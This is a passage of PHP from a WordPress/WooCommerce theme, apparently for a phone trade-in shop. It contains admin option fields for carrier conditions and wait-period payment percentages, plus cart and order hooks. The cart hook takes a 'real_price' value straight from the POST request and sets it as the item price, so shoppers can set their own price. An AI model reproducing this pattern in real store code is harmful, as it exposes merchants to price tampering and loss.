                        <tr valign="top">
                            <th scope="row"><?php esc_html_e( 'ORANGE - T MOBILE - EE', 'text-domain' ); ?></th>

                            <?php
                            if ( ! empty( $product_categories ) ) {
                                foreach ( $product_categories as $category ) {
                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
                                        $value = self::get_theme_option( $category->slug.'_orange_tmobile_ee' );
                                        ?>
                                        <td>
                                            <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_orange_tmobile_ee' ?>]" value="<?php echo esc_attr( $value ); ?>">
                                        </td>
                                        <?php
                                    }
                                }
                            }
                            ?>
                        </tr>

                        <tr valign="top">
                            <th scope="row"><?php esc_html_e( 'Vodafone', 'text-domain' ); ?></th>

                            <?php
                            if ( ! empty( $product_categories ) ) {
                                foreach ( $product_categories as $category ) {
                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
                                        $value = self::get_theme_option( $category->slug.'_vodafone' );
                                        ?>
                                        <td>
                                            <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_vodafone' ?>]" value="<?php echo esc_attr( $value ); ?>">
                                        </td>
                                        <?php
                                    }
                                }
                            }
                            ?>
                        </tr>

                    </table>
                    <br/>
                    <br/>
                    <br/>
                    <h3>Extra Payment Percentage</h3>
                    <table class="form-table wpex-custom-admin-login-table">
                        <tr>
                            <td>    </td>
                            <th scope="col"> 14 days wait </th>
                            <th scope="col"> 28 days wait </th>
                        </tr>
                        <tr valign="top">
                            <th scope="row"><?php esc_html_e( 'Extra Percentage', 'text-domain' ); ?></th>

                            <td>
                                <input class="extra_condition" type="text" name="theme_options[wait_payment14]" value="<?php echo esc_attr(self::get_theme_option('wait_payment14')); ?>">
                            </td>
                            <td>
                                <input class="extra_condition" type="text" name="theme_options[wait_payment28]" value="<?php echo esc_attr(self::get_theme_option('wait_payment28')); ?>">
                            </td>
                        </tr>

                    </table>
                    <?php submit_button(); ?>

                </form>

            </div><!-- .wrap -->
        <?php }

    }
}
new WPEX_Theme_Options();

// Helper function to use in your theme to return a theme option value
function myprefix_get_theme_option( $id = '' ) {
    return WPEX_Theme_Options::get_theme_option( $id );
}

function add_cart_item_data( $cart_item_data, $product_id, $variation_id ) {
    // Has our option been selected?
    if( ! empty( $_POST['real_price'] ) ) {
        $product = wc_get_product( $product_id );
        $price = $product->get_price();
        // Store the overall price for the product, including the cost of the warranty
        $cart_item_data['tprice'] = $_POST['real_price'];
    }
    return $cart_item_data;
}
add_filter( 'woocommerce_add_cart_item_data', 'add_cart_item_data', 10, 3 );

function before_calculate_totals( $cart_obj ) {
    // Iterate through each cart item
    foreach( $cart_obj->get_cart() as $key=>$value ) {
        if( isset( $value['tprice'] ) ) {
            $price = $value['tprice'];
            $value['data']->set_price( ( $price ) );
        }
    }
}

add_action( 'woocommerce_before_calculate_totals', 'before_calculate_totals', 10, 1 );

add_action( 'woocommerce_thankyou', 'woocommerce_track_order_table', 10 );

if ( ! function_exists( 'woocommerce_track_order_table' ) ) {

    /**
     * Displays order details in a table.
     *
     * @param mixed $order_id Order ID.
     */
    function woocommerce_track_order_table( $order_id ) {
        if ( ! $order_id ) {
            return;
        }

        wc_get_template( 'order/track-order.php', array(
            'order_id' => $order_id,
        ) );
    }
}

function xa_get_custom_meta_key( $post, $key, $single = false, $post_type='order' ) {
    if( ! is_object($post) ) {
        if( $post_type == 'order' )	{
            $post = wc_get_order($post);
        }
        else {
            $post = wc_get_product($post);
        }
    }

    if( WC()->version < '3.0' ) {
        return get_post_meta( $post->id, $key, $single );
    }
    else{
        return $post->get_meta( $key, $single );
    }
}
